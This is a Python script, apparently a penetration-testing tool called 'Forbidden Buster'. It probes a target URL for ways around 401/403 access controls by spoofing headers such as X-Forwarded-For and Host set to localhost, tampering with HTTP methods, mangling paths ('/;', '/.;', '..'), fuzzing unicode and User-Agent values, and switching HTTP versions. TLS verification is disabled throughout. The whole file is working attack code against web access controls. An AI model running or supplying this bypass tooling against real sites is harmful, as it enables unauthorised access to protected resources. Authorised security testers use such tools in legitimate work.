import requests
import argparse
import functools
import ssl
import time
import http.client
from urllib.parse import urlparse, urlunparse, urljoin, quote
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI Colors
RESET = "\033[0m"
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"

rate_limit_value = 10

def rate_limit(calls_per_second):
    min_interval = 1.0 / calls_per_second
    
    def decorator(func):
        last_time = [0.0]
        
        def wrapper(*args, **kwargs):
            nonlocal last_time
            elapsed_time = time.time() - last_time[0]
            if elapsed_time < min_interval:
                time.sleep(min_interval - elapsed_time)
            result = func(*args, **kwargs)
            last_time[0] = time.time()
            return result

        wrapper.__name__ = func.__name__
        wrapper.__doc__ = func.__doc__

        return wrapper

    return decorator

def print_banner():
    print("""
    ______         _     _     _     _             ______           _            
    |  ___|       | |   (_)   | |   | |            | ___ \         | |           
    | |_ ___  _ __| |__  _  __| | __| | ___ _ __   | |_/ /_   _ ___| |_ ___ _ __ 
    |  _/ _ \| '__| '_ \| |/ _` |/ _` |/ _ \ '_ \  | ___ \ | | / __| __/ _ \ '__|
    | || (_) | |  | |_) | | (_| | (_| |  __/ | | | | |_/ / |_| \__ \ ||  __/ |   
    \_| \___/|_|  |_.__/|_|\__,_|\__,_|\___|_| |_| \____/ \__,_|___/\__\___|_|   
                                                                                                                                                
                                                @ Sn1r
        
        """)

@rate_limit(rate_limit_value)
def perform_headers_bypass(url, args, headers_bypass, custom_headers=None):
    print(f"{YELLOW}[INFO] Trying to bypass with headers...{RESET}")
    if args.method:
            user_method = args.method.upper()
    else:
        user_method = "GET"   

    for header_key, header_value in headers_bypass.items():
        headers = {}
        if custom_headers is not None:
            headers.update(custom_headers)

        headers[header_key] = header_value

        if user_method == "POST":
            r = requests.post(url, headers=headers, verify=False, allow_redirects=False)
        elif user_method == "PUT":
            r = requests.put(url, headers=headers, verify=False, allow_redirects=False)
        elif user_method == "DELETE":
            r = requests.delete(url, headers=headers, verify=False, allow_redirects=False)
        else:
            r = requests.get(url, headers=headers, verify=False, allow_redirects=False)
        
        if args.proxy:
            r = requests.request(user_method, url, headers=headers, proxies={"http": args.proxy, "https": args.proxy}, verify=False, allow_redirects=False)

        status_code = r.status_code
        if status_code == 200:
            status_color = GREEN
        elif status_code in (401,403):
            status_color = RED
        else:
            status_color = RESET
        print(f"{status_color}{user_method} {url} with header {header_key}: {status_code}{RESET}")
        
@rate_limit(rate_limit_value)
def perform_method_bypass(url, args, headers_bypass, method_bypass, custom_headers=None):
    print(f"\n{YELLOW}[INFO] Trying to bypass with HTTP methods...{RESET}")
    for method in method_bypass:
        if args.method:
            user_method = args.method.upper()
        else:
            user_method = "GET"  
        if user_method == method:
            continue 

        headers = {}
        if custom_headers is not None:
            headers.update(custom_headers)

        if not url.startswith("http"):
            url = "http://" + url  

        if method == "POST":
            r = requests.post(url, verify=False, headers=headers, allow_redirects=False)
        elif method == "PUT":
            r = requests.put(url, verify=False, headers=headers,allow_redirects=False)
        elif method == "DELETE":
            r = requests.delete(url, verify=False, headers=headers, allow_redirects=False)
        else:
            r = requests.get(url, verify=False, headers=headers, allow_redirects=False)
        
        if args.proxy:
            r = requests.request(method, url, proxies={"http": args.proxy, "https": args.proxy}, headers=headers, verify=False, allow_redirects=False)

        status_code = r.status_code
        if status_code == 200:
            status_color = GREEN
        elif status_code in (401,403):
            status_color = RED
        else:
            status_color = RESET
        print(f"{status_color}{method} {url}: {status_code}{RESET}")

def generate_path_variants(path):
    paths = [
        path,            
        path.upper(),    
        path + "/",      
        path + "/.",     
        "//" + path + "//",       
        "." + path + "/..",       
        "/;" + path,              
        "/.;" + path,             
        "//;/" + path,            
        path.split('/')[-1] + ".json" 
    ]

    return paths

@rate_limit(rate_limit_value)
def perform_path_bypass(url, path, args, user_method, custom_headers=None):
    print(f"\n{YELLOW}[INFO] Trying to bypass with path fuzzing...{RESET}")

    base_url = url

    for path_variant in generate_path_variants(path):
        path_variant = path_variant.lstrip('/')

        parsed_url = urlparse(urljoin(base_url, path_variant))
        parsed_url._replace(path=parsed_url.path.lstrip('/'))
        request_url = urlunparse(parsed_url._replace(path=path_variant))

        headers = {}
        if custom_headers is not None:
            headers.update(custom_headers)
        
        if user_method == "POST":
            r = requests.post(request_url, verify=False, headers=headers, allow_redirects=False)
        elif user_method == "PUT":
            r = requests.put(request_url, verify=False, headers=headers, allow_redirects=False)
        elif user_method == "DELETE":
            r = requests.delete(request_url, verify=False, headers=headers, allow_redirects=False)
        else:
            r = requests.get(request_url, verify=False, headers=headers, allow_redirects=False)

        if args.proxy:
            r = requests.request(user_method, request_url, headers=headers, proxies={"http": args.proxy, "https": args.proxy}, verify=False, allow_redirects=False)
        
        status_code = r.status_code
        if status_code == 200:
            status_color = GREEN
        elif status_code in (401,403):
            status_color = RED
        else:
            status_color = RESET
        print(f"{status_color}{user_method} {request_url}: {r.status_code}{RESET}")

@rate_limit(rate_limit_value)
def perform_unicode_bypass(url, path, user_method, args, custom_headers=None):
    print(f"\n{YELLOW}[INFO] Trying to bypass path with unicode fuzzing...{RESET}")

    headers = {}
    if custom_headers is not None:
        headers.update(custom_headers)

    base_url = url.rstrip('/')

    with open('./wordlists/Unicode.txt', 'r') as file:
        fuzz_strings = file.read().splitlines()

    for fuzz_string in fuzz_strings:
        variants = [
            f"/{quote(fuzz_string)}{quote(path)}",  
            f"/{quote(path)}/{quote(fuzz_string)}",  
            f"/{quote(path)}{quote(fuzz_string)}" 
        ]

        for path_variant in variants:
            path_variant = path_variant.lstrip('/')
            request_url = urljoin(base_url, path_variant)

            if user_method == "POST":
                if args.proxy:
                    r = requests.post(request_url, verify=False, allow_redirects=False, headers=headers, proxies={"http": args.proxy, "https": args.proxy})
                else:
                    r = requests.post(request_url, verify=False, headers=headers, allow_redirects=False)
            elif user_method == "PUT":
                if args.proxy:
                    r = requests.put(request_url, verify=False, headers=headers, allow_redirects=False, proxies={"http": args.proxy, "https": args.proxy})
                else:
                    r = requests.put(request_url, verify=False, headers=headers, allow_redirects=False)
            elif user_method == "DELETE":
                if args.proxy:
                    r = requests.delete(request_url, verify=False, headers=headers, allow_redirects=False, proxies={"http": args.proxy, "https": args.proxy})
                else:
                    r = requests.delete(request_url, verify=False, headers=headers, allow_redirects=False)
            else:
                if args.proxy:
                    r = requests.get(request_url, verify=False, allow_redirects=False, headers=headers, proxies={"http": args.proxy, "https": args.proxy})
                else:
                    r = requests.get(request_url, verify=False, headers=headers, allow_redirects=False)
            
            status_code = r.status_code
            if status_code == 200:
                status_color = GREEN
            elif status_code in (401,403):
                status_color = RED
            else:
                status_color = RESET
            print(f"{status_color}{user_method} {request_url}: {status_code}{RESET}")

@rate_limit(rate_limit_value)
def perform_user_agent_bypass(url, args, custom_headers=None):
    print(f"{YELLOW}\n[INFO] Trying to bypass with User-Agent fuzzing...{RESET}")

    headers = {}
    if custom_headers is not None:
        headers.update(custom_headers)

    if not url.startswith("http"):
        url = "http://" + url

    with open('./wordlists/UserAgents.fuzz.txt', 'r') as file:
        user_agents = file.read().splitlines()

    for user_agent in user_agents:
        headers["User-Agent"] = user_agent
        r = requests.get(url, headers=headers, verify=False, allow_redirects=False)

        if args.proxy:
            r = requests.get(url, headers=headers, proxies={"http": args.proxy, "https": args.proxy}, verify=False, allow_redirects=False)


        status_code = r.status_code
        if status_code == 200:
            status_color = GREEN
        elif status_code in (401,403):
            status_color = RED
        else:
            status_color = RESET
        print(f"{status_color}User-Agent: {user_agent} - Status Code: {r.status_code}{RESET}")

@rate_limit(rate_limit_value)
def perform_protocol_bypass(url, user_method, args, custom_headers=None):
    print(f"\n{YELLOW}[INFO] Trying to bypass with HTTP protocols...{RESET}")

    base_url = url

    http_versions = ["HTTP/1.0", "HTTP/1.1", "HTTP/2"]

    for version in http_versions:
        if args.method:
            user_method = args.method.upper()

        if not url.startswith("http"):
            url = "http://" + url

        parsed_url = urlparse(url)
        host = parsed_url.netloc
        path = parsed_url.path

        headers = {"Host": host}

        if custom_headers:
            headers.update(custom_headers)

        try:
            if args.proxy:
                proxy_url = urlparse(args.proxy)
                conn = http.client.HTTPSConnection(proxy_url.netloc, context=ssl._create_unverified_context())
                conn._http_vsn_str = version
                conn._http_vsn = int(version[5])
                request_line = f"{user_method} {url}"
                conn.set_tunnel(host, headers=headers)
            else:
                conn = http.client.HTTPConnection(host)
                conn._http_vsn_str = version
                conn._http_vsn = int(version[5])
                request_line = f"{user_method} {path}"

            conn.request(user_method, path, headers=headers)
            response = conn.getresponse()
            conn.close()

            if response.status == 200:
                status_color = GREEN
            elif response.status in (401, 403):
                status_color = RED
            else:
                status_color = RESET
            print(f"{status_color}{version} {user_method} {url}: {response.status}{RESET}")

        except http.client.BadStatusLine as e:
            print(f"{RED}[ERROR] Bad Status Line: {e}{RESET}")
            continue

def validate_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        raise ValueError("Invalid URL format. URL must include a scheme (http:// or https://).")

    try:
        parsed_url = urlparse(url)
        return parsed_url
    except ValueError:
        raise ValueError("Invalid URL format. URL must be of the form 'http://example.com' or 'https://example.com'.")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Full path to be used", required=True, nargs=1)
    parser.add_argument("-m", "--method", help="Method to be used. Default is GET")
    parser.add_argument("-a", "--headers", action="append", help="Add custom headers")
    parser.add_argument("-p", "--proxy", help="Use Proxy")
    parser.add_argument("--rate-limit", type=int, default=10, help="Rate limit (calls per second)")
    parser.add_argument("--include-unicode", action="store_true", help="Include Unicode fuzzing (stressful)")
    parser.add_argument("--include-user-agent", action="store_true", help="Include User-Agent fuzzing (stressful)")
    
    args = parser.parse_args()
    global rate_limit_value
    rate_limit_value = args.rate_limit

    custom_headers = None

    if args.headers is not None:
        custom_headers = {}
        for header in args.headers:
            key_value = header.split(':')
            if len(key_value) == 2:
                key, value = key_value
                custom_headers[key.strip()] = value.strip()
            else:
                print(f"\n{YELLOW}[WARNING] Invalid header format: {header}. Skipping...{RESET}\n")

    try:
        headers_bypass = {
            "X-Originating-IP": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded": "127.0.0.1",
            "Forwarded-For": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-ProxyUser-Ip": "127.0.0.1",
            "X-Original-URL": "127.0.0.1",
            "Client-IP": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "Cluster-Client-IP": "127.0.0.1",
            "X-ProxyUser-Ip": "127.0.0.1",
            "Host": "localhost",
            "Host": "somevalue"
        }

        method_bypass = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "CONNECT", "TRACE", "OPTIONS", "INVENTED", "HACK"]
        
        if args.url:
            url = args.url[0]
            validate_result = validate_url(url)
            user_method = args.method if args.method else "GET"
            url_parts = urlparse(url)
            path = url_parts.path

            
            perform_headers_bypass(url, args, headers_bypass, custom_headers)
            perform_method_bypass(url, args, headers_bypass, method_bypass, custom_headers)
            perform_path_bypass(url, path, args, user_method, custom_headers)
            perform_protocol_bypass(url, user_method, args, custom_headers)
            
            if args.include_unicode:
                perform_unicode_bypass(url, path, user_method, args, custom_headers)

            if args.include_user_agent:
                perform_user_agent_bypass(url, args, custom_headers)

            
            print(f"{GREEN}\n[+] Done. you may review the results{RESET}")

    except KeyboardInterrupt:
        print(f"\n{YELLOW}[WARNING] Stopping...{RESET}")
    
    except ConnectionRefusedError:
        print(f"\n{RED}[ERROR] Connection refused{RESET}")

    except ConnectionError:
        print(f"\n{RED}[ERROR] Connection Error detected{RESET}")
    
    except requests.exceptions.SSLError as ssl_error:
        print(f"\n{RED}[ERROR] SSL Error: \n{ssl_error}{RESET}")
    
    except ValueError:
        print(f"\n{YELLOW}[WARNING] Please include a scheme (http:// or https://) inside the provided URL{RESET}")
    
    except requests.exceptions.ConnectionError as e:
        print(f"\n{RED}[ERROR] Connection Error: \n{e}{RESET}")

    except requests.exceptions.RequestException as e:
        print(f"\n{RED}[ERROR] Request Error: \n{e}{RESET}")

if __name__ == '__main__':
    print_banner()
    main()
